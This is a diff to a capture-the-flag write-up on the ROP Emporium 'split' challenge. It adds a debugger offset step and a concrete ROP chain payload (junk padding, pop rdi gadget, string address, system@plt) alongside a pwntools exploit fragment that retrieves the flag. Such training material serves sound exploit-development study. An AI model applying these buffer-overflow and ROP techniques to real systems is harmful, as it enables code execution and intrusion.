@@ -90,6 +90,7 @@ As expected the program crashed and we have a valid crash scenario here.
 
 ###### Calculating offset
 
+Copy the value in RSP to pattern offset tool.
 ```
 gef➤  pattern offset 0x00007fffffffe048
 [+] Searching '0x00007fffffffe048'
@@ -132,6 +133,9 @@ As we have all the pieces to put together our ROPChain, Now let’s craft the pa
 
 Junk + pop_rdi + bin_cat + system_plt
 
+b"A" * 40 + 0x0000000000400883 + 0x00601060 + 0x4005e0
+
+
 
 Final exploit using pwntools:
 
@@ -150,22 +154,17 @@ Final exploit using pwntools:
      payload = offset + pop_rdi + usefullString + system_plt                                                                                                          
      p.sendlineafter(">",payload)                                                                                                                                     
      print (p.recvall())                                                                                                                                              
-                                                                                                                                                                      
+                                                                                                                                                           
  if __name__ == "__main__":                                                                                                                                           
      main() 
     
    ```
 
-
-
-
-
-
 w00t we got the flag!
 
 ###### End 
 
-Thats the end of ret2win challenge,it is a very simple one but as i progress through the challenges the exploits will become more complex and fun. Remember never stop learning, Cheers!.
+Thats the end of split challenge, we learned how to build a simple ROPChain. Cheers!.
 
 > Code for this challenge  https://github.com/d3b4g/ROP-Emporium
 
